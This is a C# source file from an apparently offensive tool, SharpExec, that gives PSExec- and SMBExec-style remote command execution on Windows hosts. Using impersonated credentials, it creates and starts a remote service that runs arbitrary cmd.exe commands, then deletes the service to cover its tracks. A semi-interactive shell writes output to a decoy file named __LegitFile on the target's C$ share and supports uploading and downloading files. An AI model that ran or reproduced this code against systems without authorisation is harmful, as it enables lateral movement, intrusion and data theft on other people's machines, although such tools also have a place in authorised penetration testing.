using System;
using System.ComponentModel;
using System.IO;

namespace SharpExec
{
    class ManageService
    {
        //Handles PSExec like functionality        
        public void PSExec(string rhost, string serviceName, string serviceDisplayName, string executionPath, string cmdArgs, string domain, string username, string password, bool fileUploaded)
        {
            if (username == "" && password == "")
            {
                if (fileUploaded == true)
                {                   
                    executionPath = @"C:\WINDOWS\system32\cmd.exe /c " + executionPath; //This line can be removed if you want to execute the file directly without calling cmd
                    using (var scmHandle = NativeMethods.OpenSCManager(rhost, null, NativeMethods.SCM_ACCESS.SC_MANAGER_CREATE_SERVICE))
                    {
                        if (scmHandle.IsInvalid)
                        {
                            throw new Win32Exception();
                        }
                        using (
                        var serviceHandle = NativeMethods.CreateService(
                            scmHandle,
                            serviceName,
                            serviceDisplayName,
                            NativeMethods.SERVICE_ACCESS.SERVICE_ALL_ACCESS,
                            NativeMethods.SERVICE_TYPES.SERVICE_WIN32_OWN_PROCESS,
                            NativeMethods.SERVICE_START_TYPES.SERVICE_AUTO_START,
                            NativeMethods.SERVICE_ERROR_CONTROL.SERVICE_ERROR_IGNORE,
                            executionPath + " " + cmdArgs,
                            null,
                            IntPtr.Zero,
                            null,
                            null,
                            null))
                        {
                            try
                            {
                                Console.WriteLine("[+] Starting service");
                                NativeMethods.StartService(serviceHandle, 0, null);
                                Console.WriteLine("[+] Service started successfully");
                                Console.WriteLine();
                            }
                            catch
                            {
                                Console.WriteLine("[-] Error starting service");
                                Console.WriteLine();
                                Console.WriteLine("[-] Please check that you have appropriate rights and/or that service doesn't already exist");
                            }
                            try
                            {                                
                                Console.WriteLine("[+] Removing service");
                                Console.WriteLine();                                
                                NativeMethods.DeleteService(serviceHandle);
                                Console.WriteLine("[+] Removed service successfully");
                                Console.WriteLine();
                            }
                            catch
                            {
                                Console.WriteLine("[-] Error removing service");
                                Console.WriteLine();
                                Console.WriteLine("[-] Please delete service manually");
                                Console.WriteLine();
                            }
                        }
                    }
                }
            }
            else
            {
                using (new Impersonation(domain, username, password))
                {
                    if (fileUploaded == true)
                    {                        
                        executionPath = @"C:\WINDOWS\system32\cmd.exe  /c " + executionPath; //This line can be removed if you want to execute the file directly without calling cmd
                        using (var scmHandle = NativeMethods.OpenSCManager(rhost, null, NativeMethods.SCM_ACCESS.SC_MANAGER_CREATE_SERVICE))
                        {
                            if (scmHandle.IsInvalid)
                            {
                                throw new Win32Exception();
                            }
                            using (
                            var serviceHandle = NativeMethods.CreateService(
                                scmHandle,
                                serviceName,
                                serviceDisplayName,
                                NativeMethods.SERVICE_ACCESS.SERVICE_ALL_ACCESS,
                                NativeMethods.SERVICE_TYPES.SERVICE_WIN32_OWN_PROCESS,
                                NativeMethods.SERVICE_START_TYPES.SERVICE_AUTO_START,
                                NativeMethods.SERVICE_ERROR_CONTROL.SERVICE_ERROR_IGNORE,
                                executionPath + " " + cmdArgs,
                                null,
                                IntPtr.Zero,
                                null,
                                null,
                                null))
                            {
                                try
                                {
                                    Console.WriteLine("[+] Starting service");
                                    NativeMethods.StartService(serviceHandle, 0, null);
                                    Console.WriteLine("[+] Service started successfully");
                                    Console.WriteLine();
                                }
                                catch
                                {
                                    Console.WriteLine("[-] Error starting service");
                                    Console.WriteLine();
                                    Console.WriteLine("[-] Please check that you have appropriate rights and/or that service doesn't already exist");
                                }
                                try
                                {
                                    
                                    Console.WriteLine("[+] Removing service");
                                    Console.WriteLine();                                   
                                    NativeMethods.DeleteService(serviceHandle);
                                    Console.WriteLine("[+] Removed service successfully");
                                    Console.WriteLine();
                                }
                                catch
                                {
                                    Console.WriteLine("[-] Error removing service");
                                    Console.WriteLine();
                                    Console.WriteLine("[-] Please delete service manually");
                                    Console.WriteLine();
                                }
                            }
                        }
                    }
                }
            }
        }
        //Handles SMBExec semi-interactive shell functionality 
        public void smbExec(string rhost, string serviceName, string serviceDisplayName, string cmdArgs, string domain, string username, string password)
        {
            Console.WriteLine();
            Console.WriteLine("[+] Using SMBExec module semi-interactive shell");
            Console.WriteLine("[+] Be careful what you execute");
            Console.WriteLine();                        

            if (username == "" && password == "")
            {
                Console.Write(@"C:\WINDOWS\system32>");

                while (cmdArgs.ToLower() != "exit")
                {
                    //Handles uploading file to current remote directory
                    if (cmdArgs.ToLower().Contains("put "))
                    {
                        try
                        {
                            Char delimiter = ' ';
                            String[] put = cmdArgs.Split(delimiter);
                            string localPath = put[1];
                            string remotePath = put[2];                            
                            FileAddRemove uploadFile = new FileAddRemove();
                            uploadFile.upload(localPath, remotePath, rhost, username, password, domain);
                            Console.WriteLine();
                            Console.Write(@"C:\WINDOWS\system32>");
                        }
                        catch
                        {
                            Console.WriteLine();
                            Console.WriteLine("[-] Something went wrong with the put command.  Check syntax and try again. ");
                            Console.WriteLine();
                        }
                    }
                    //Handles downloading file from current remote directory
                    else if (cmdArgs.ToLower().Contains("get "))
                    {
                        try
                        {
                            Char delimiter = ' ';
                            String[] put = cmdArgs.Split(delimiter);
                            string localPath = put[2];
                            string remotePath = put[1];                            
                            FileAddRemove uploadFile = new FileAddRemove();
                            uploadFile.get(localPath, remotePath, rhost, username, password, domain);
                            Console.WriteLine();
                            Console.Write(@"C:\WINDOWS\system32>");
                        }
                        catch
                        {
                            Console.WriteLine();
                            Console.WriteLine("[-] Something went wrong with the get command.  Check syntax and try again. ");
                            Console.WriteLine();
                        }
                    }
                    else if (cmdArgs.ToLower().Contains("help"))
                    {
                        Console.WriteLine("Commands             Description");
                        Console.WriteLine("--------             -----------");
                        Console.WriteLine("put                  Upload file from local directory to current shell directory, put fullLocalPath\\File.txt fullLocalPath\\File.txt");
                        Console.WriteLine("get                  Download file from current shell directory to local directory, get fullLocalPath\\File.txt fullLocalPath\\File.txt");
                        Console.WriteLine("help                 Show help menu");
                        Console.WriteLine("exit                 Exit shell");
                        Console.WriteLine();
                        Console.Write(@"C:\WINDOWS\system32>");
                    }
                    else if (cmdArgs.ToLower().Contains("cd"))
                    {
                        Console.WriteLine();
                        Console.WriteLine("You can't CD under SMBEXEC. Use full paths.");
                        Console.WriteLine();
                        Console.Write(@"C:\WINDOWS\system32>");
                    }
                    else
                    {
                        using (var scmHandle = NativeMethods.OpenSCManager(rhost, null, NativeMethods.SCM_ACCESS.SC_MANAGER_CREATE_SERVICE))
                        {
                                if (scmHandle.IsInvalid)
                                {
                                    throw new Win32Exception();
                                }
                                using (
                                var serviceHandle = NativeMethods.CreateService(
                                    scmHandle,
                                    serviceName,
                                    serviceDisplayName,
                                    NativeMethods.SERVICE_ACCESS.SERVICE_ALL_ACCESS,
                                    NativeMethods.SERVICE_TYPES.SERVICE_WIN32_OWN_PROCESS,
                                    NativeMethods.SERVICE_START_TYPES.SERVICE_DEMAND_START,
                                    NativeMethods.SERVICE_ERROR_CONTROL.SERVICE_ERROR_IGNORE,
                                    @"%COMSPEC% /Q /c echo " + cmdArgs + @" ^> \\" + rhost + @"\C$\__LegitFile 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat",
                                    null,
                                    IntPtr.Zero,
                                    null,
                                    null,
                                    null))
                                {
                                    try
                                    {
                                        NativeMethods.StartService(serviceHandle, 0, null);

                                    }
                                    catch
                                    {                                        
                                        Console.WriteLine("[-]Error. Please check that you have appropriate rights and/or that service doesn't already exist");
                                    }
                                    try
                                    {
                                        System.Threading.Thread.Sleep(2000);
                                        NativeMethods.DeleteService(serviceHandle);
                                    }
                                    catch
                                    {
                                        Console.WriteLine("[-] Error removing service");
                                        Console.WriteLine();
                                        Console.WriteLine("[-] Please delete service manually");
                                        Console.WriteLine();
                                    }
                                }
                        }
                            string output = @"\\" + rhost + @"\C$\__LegitFile";
                            if (File.Exists(output))
                            {
                                using (StreamReader file = new StreamReader(output))
                                {
                                    int counter = 0;
                                    string ln;

                                    while ((ln = file.ReadLine()) != null)
                                    {
                                        Console.WriteLine();
                                        Console.WriteLine(ln);
                                        counter++;
                                    }
                                    file.Close();
                                    File.Delete(output);

                                    Console.WriteLine();
                                    Console.Write(@"C:\WINDOWS\system32>");
                                }
                            }                              
                    }
                                cmdArgs = Console.ReadLine();
                }
            }
            else
            {
               Console.Write(@"C:\WINDOWS\system32>");

                while (cmdArgs.ToLower() != "exit")
                {
                    //Handles uploading file to current remote directory
                    if (cmdArgs.ToLower().Contains("put "))
                    {
                        try
                        {
                            Char delimiter = ' ';
                            String[] put = cmdArgs.Split(delimiter);
                            string localPath = put[1];
                            string remotePath = put[2];
                            FileAddRemove uploadFile = new FileAddRemove();
                            uploadFile.upload(localPath, remotePath, rhost, username, password, domain);
                            Console.WriteLine();
                            Console.Write(@"C:\WINDOWS\system32>");
                        }
                        catch
                        {
                            Console.WriteLine();
                            Console.WriteLine("[-] Something went wrong with the put command.  Check syntax and try again. ");
                            Console.WriteLine();
                        }
                    }
                    //Handles downloading file from current remote directory
                    else if (cmdArgs.ToLower().Contains("get "))
                    {
                        try
                        {
                            Char delimiter = ' ';
                            String[] put = cmdArgs.Split(delimiter);
                            string localPath = put[2];
                            string remotePath = put[1];
                            FileAddRemove uploadFile = new FileAddRemove();
                            uploadFile.get(localPath, remotePath, rhost, username, password, domain);
                            Console.WriteLine();
                            Console.Write(@"C:\WINDOWS\system32>");
                        }
                        catch
                        {
                            Console.WriteLine();
                            Console.WriteLine("[-] Something went wrong with the get command.  Check syntax and try again. ");
                            Console.WriteLine();
                        }
                    }
                    else if (cmdArgs.ToLower().Contains("help"))
                    {
                        Console.WriteLine("Commands             Description");
                        Console.WriteLine("--------             -----------");
                        Console.WriteLine("put                  Upload file from local directory to current shell directory, put fullLocalPath\\File.txt fullLocalPath\\File.txt");
                        Console.WriteLine("get                  Download file from current shell directory to local directory, get fullLocalPath\\File.txt fullLocalPath\\File.txt");
                        Console.WriteLine("help                 Show help menu");
                        Console.WriteLine("exit                 Exit shell");
                        Console.WriteLine();
                        Console.Write(@"C:\WINDOWS\system32>");
                    }
                    else if (cmdArgs.ToLower().Contains("cd"))
                    {
                        Console.WriteLine();
                        Console.WriteLine("You can't CD under SMBEXEC. Use full paths.");
                        Console.WriteLine();
                        Console.Write(@"C:\WINDOWS\system32>");
                    }
                    else
                    {
                        using (new Impersonation(domain, username, password))
                        {
                            using (var scmHandle = NativeMethods.OpenSCManager(rhost, null, NativeMethods.SCM_ACCESS.SC_MANAGER_CREATE_SERVICE))
                            {
                                if (scmHandle.IsInvalid)
                                {
                                    throw new Win32Exception();
                                }
                                using (
                                var serviceHandle = NativeMethods.CreateService(
                                    scmHandle,
                                    serviceName,
                                    serviceDisplayName,
                                    NativeMethods.SERVICE_ACCESS.SERVICE_ALL_ACCESS,
                                    NativeMethods.SERVICE_TYPES.SERVICE_WIN32_OWN_PROCESS,
                                    NativeMethods.SERVICE_START_TYPES.SERVICE_DEMAND_START,
                                    NativeMethods.SERVICE_ERROR_CONTROL.SERVICE_ERROR_IGNORE,
                                    @"%COMSPEC% /Q /c echo " + cmdArgs + @" ^> \\" + rhost + @"\C$\__LegitFile 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat",
                                    null,
                                    IntPtr.Zero,
                                    null,
                                    null,
                                    null))
                                {
                                    try
                                    {
                                        NativeMethods.StartService(serviceHandle, 0, null);

                                    }
                                    catch
                                    {
                                        Console.WriteLine("[-] Error starting service");
                                        Console.WriteLine();
                                        Console.WriteLine("[-] Please check that you have appropriate rights and/or that service doesn't already exist");
                                    }
                                    try
                                    {
                                        System.Threading.Thread.Sleep(2000);
                                        NativeMethods.DeleteService(serviceHandle);
                                    }
                                    catch
                                    {
                                        Console.WriteLine("[-] Error removing service");
                                        Console.WriteLine();
                                        Console.WriteLine("[-] Please delete service manually");
                                        Console.WriteLine();
                                    }
                                }
                            }

                            string output = @"\\" + rhost + @"\C$\__LegitFile";
                            if (File.Exists(output))
                            {
                                using (StreamReader file = new StreamReader(output))
                                {
                                    int counter = 0;
                                    string ln;

                                    while ((ln = file.ReadLine()) != null)
                                    {
                                        Console.WriteLine();
                                        Console.WriteLine(ln);
                                        counter++;
                                    }
                                    file.Close();
                                    File.Delete(output);

                                    Console.WriteLine();
                                    Console.Write(@"C:\WINDOWS\system32>");
                                }
                            }
                        }                        
                    }
                    cmdArgs = Console.ReadLine();
                }
            }
        }
    }
}
